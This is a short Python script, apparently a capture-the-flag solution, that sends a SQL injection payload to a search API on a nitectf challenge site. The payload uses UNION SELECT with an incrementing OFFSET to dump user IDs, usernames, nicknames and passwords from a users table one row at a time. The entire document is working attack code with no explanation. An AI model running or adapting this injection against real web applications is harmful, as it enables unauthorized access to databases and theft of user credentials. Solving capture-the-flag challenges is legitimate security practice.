import requests

for i in range(0xff):
    res = requests.get(
        f"http://litelibrary.web.nitectf.live/api/search?q=s' UNION SELECT liteid,liteusername,gender,litenick,litepass FROM users LIMIT 1 OFFSET {i}; -- s"
    )
    print(res.text)
